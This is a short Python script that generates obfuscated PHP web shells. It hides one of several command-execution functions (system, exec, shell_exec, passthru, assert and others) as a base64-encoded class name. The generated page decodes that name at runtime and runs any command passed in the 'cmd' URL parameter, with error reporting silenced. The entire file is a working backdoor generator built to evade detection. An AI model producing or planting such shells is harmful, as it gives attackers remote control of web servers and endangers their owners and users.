import random

templates = '''
<?php
error_reporting(0);
    class {fill}{
        public $s;
    }
    $a=new {fill}();
    $e = get_class($a);
    $e.='==';
    $b=base64_decode($e);
    $b=substr($b,1);
           $a->s=$_GET['cmd'];
           $temp=$a->s;
    $b($temp);
?>
'''

preList = [
    "YWFzc2VydA", "c3N5c3RlbQ", "ZWV4ZWM", "c3NoZWxsX2V4ZWM", 
    "cHByb2Nfb3Blbg", "cHBvcGVu", "cHBjbnRsX2V4ZWM",
    "cHBhc3N0aHJ1", "ZWV4cGVjdF9wb3Blbg"
    ]
print(templates.replace("{fill}", random.choice(preList)))